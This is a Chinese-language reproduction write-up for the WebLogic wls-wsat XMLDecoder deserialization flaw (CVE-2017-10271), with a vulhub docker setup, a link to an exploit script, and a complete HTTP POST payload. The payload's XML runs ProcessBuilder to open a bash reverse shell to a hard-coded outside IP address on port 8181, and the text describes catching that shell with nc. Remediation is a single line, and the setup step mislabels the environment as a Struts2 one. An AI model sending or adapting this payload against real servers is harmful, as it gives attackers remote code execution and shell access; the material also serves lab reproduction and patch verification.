#Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞

####1、CVE
CVE-2017-10271

####2、危害等级
<font color = 'red'>高危</font>

####3、漏洞描述
Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组件存在安全漏洞。使用精心构造的xml数据可能造成任意代码执行，攻击者只需要发送精心构造的 HTTP 请求，就可以拿到目标服务器

的权限。攻击者可利用该漏洞控制组件，影响数据的可用性、保密性和完整性。

####4、公开日期
2017年06月21日
####5、利用工具

```
git clone https://github.com/c0mmand3rOpSec/CVE-2017-10271/blob/master/exploit.py
```

####复现过程

##### 1、运行struts2-053docker环境
```
0x1：git clone https://github.com/vulhub/vulhub.git 
0x2：cd /vulhub/weblogic/CVE-2017-10271
0x3：docker-compose up -d
```
##### 2、漏洞测试
2.1 等待一段时间，访问http://127.0.0.1:7001/即可看到一个404页面，说明weblogic已成功启动。

![](images/weblogic1.png)

2.2 Payload

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 127.0.0.1:7001
Accept-Encoding: gzip, deflate
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: */*
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: text/xml
Content-Length: 647

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.8" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder"> 
<array class="java.lang.String" length="3"> 
<void index="0"> 
<string>/bin/bash</string>
</void> 
<void index="1">
<string>-c</string> 
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/39.104.58.84/8181 0&gt;&amp;1</string>
</void>
</array> 
<void method="start"/>
</void>
</java> 
</work:WorkContext> 
</soapenv:Header>  
<soapenv:Body/> 
```
2.3	本地burpsuite下执行payload

![](images/weblogic2.png)

2.4 阿里云nc反弹shell

![](images/weblogic3.png)

2.4 工具测试

python weblogic_exp.py

![](images/weblogic4.png)

####修复建议

更新官方补丁